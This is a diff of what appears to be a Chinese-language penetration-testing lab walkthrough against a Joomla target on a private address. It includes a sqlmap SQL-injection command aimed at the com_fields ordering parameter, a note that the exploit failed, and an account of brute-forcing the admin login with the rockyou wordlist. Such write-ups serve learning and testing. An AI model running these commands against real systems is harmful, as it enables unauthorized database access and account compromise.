@@ -69,6 +69,8 @@ http://192.168.10.176/joomla/administrator/manifests/files/joomla.xml
 sqlmap -u 'http://192.168.10.176/joomla/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 ```
 
+但是最后没有验证成功，这个 exp 不能用。
+
 看到了一个登陆页面 http://192.168.10.176/joomla/administrator/ 登陆页面，先用前面得到的 rob 、 admin、 joomla 用户，尝试使用 rockyou 字典爆破，没有获得密码。
 
 (这里可能想不到，joomla 的默认用户是 admin，但是 admin 爆不出，只有尝试将可能的用户都进行爆破)
